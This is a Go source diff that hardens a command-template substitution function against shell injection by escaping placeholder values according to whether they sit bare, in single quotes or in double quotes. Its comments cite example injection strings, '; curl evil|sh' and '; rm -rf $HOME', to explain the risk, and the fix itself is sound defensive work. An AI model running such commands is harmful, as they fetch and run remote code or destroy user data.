@@ -62,11 +62,31 @@ func isPlaceholderIdent(s string) bool {
 // substitute replaces {name} placeholders in cmd with shell-quoted arg
 // values. Unknown args (placeholders without a corresponding key in
 // args) result in an error rather than silent dropping.
+//
+// A value is escaped for where the placeholder sits. Bare, it is quoted as a
+// whole. Inside the template's own quotes, '{x}' or "{x}", quoting it again
+// would close the author's quotes around it and leave the value itself bare,
+// where "; curl evil|sh" runs; there it is escaped for that kind of quote
+// instead, so it stays one literal string whichever way the author wrote it.
 func substitute(cmd string, params map[string]ToolParam, args map[string]any) (string, error) {
 	var b strings.Builder
+	var quote byte // the template's open quote at this point: 0, '\'' or '"'
 	for i := 0; i < len(cmd); i++ {
 		if cmd[i] != '{' {
-			b.WriteByte(cmd[i])
+			c := cmd[i]
+			b.WriteByte(c)
+			switch {
+			case quote == 0 && c == '\\', quote == '"' && c == '\\':
+				// An escaped character is taken as it is, quote or not.
+				if i+1 < len(cmd) {
+					i++
+					b.WriteByte(cmd[i])
+				}
+			case quote == 0 && (c == '\'' || c == '"'):
+				quote = c
+			case quote != 0 && c == quote:
+				quote = 0
+			}
 			continue
 		}
 		end := strings.IndexByte(cmd[i+1:], '}')
@@ -103,11 +123,16 @@ func substitute(cmd string, params map[string]ToolParam, args map[string]any) (s
 		case string:
 			skipQuote = looksLikeNumberLiteral(v) || looksLikeBoolLiteral(v)
 		}
-		if skipQuote {
+		switch {
+		case quote == '\'':
+			b.WriteString(singleQuotedBody(stringify(val)))
+		case quote == '"':
+			b.WriteString(doubleQuotedBody(stringify(val)))
+		case skipQuote:
 			// Trimmed: " 1\n" parses as a number, and a bare newline would
 			// end the command there and run the rest of the template alone.
 			b.WriteString(strings.TrimSpace(stringify(val)))
-		} else {
+		default:
 			b.WriteString(shellQuote(stringify(val)))
 		}
 		i = i + 1 + end
@@ -169,6 +194,27 @@ func stringify(v any) string {
 // quotes via the standard `'\”` POSIX trick. Suitable for any sh
 // shell. Critical for safety — without this, a placeholder value
 // containing `; rm -rf $HOME` would execute as a command.
+// singleQuotedBody is s as it reads inside a single-quoted shell string: a
+// quote in it closes the string, adds an escaped quote and opens it again.
+func singleQuotedBody(s string) string {
+	return strings.ReplaceAll(s, "'", `'\''`)
+}
+
+// doubleQuotedBody is s as it reads inside a double-quoted shell string: the
+// four characters a shell still interprets there are escaped, so $(...),
+// backticks and $VAR stay text.
+func doubleQuotedBody(s string) string {
+	var b strings.Builder
+	for i := 0; i < len(s); i++ {
+		switch s[i] {
+		case '\\', '"', '$', '`':
+			b.WriteByte('\\')
+		}
+		b.WriteByte(s[i])
+	}
+	return b.String()
+}
+
 func shellQuote(s string) string {
 	if s == "" {
 		return "''"
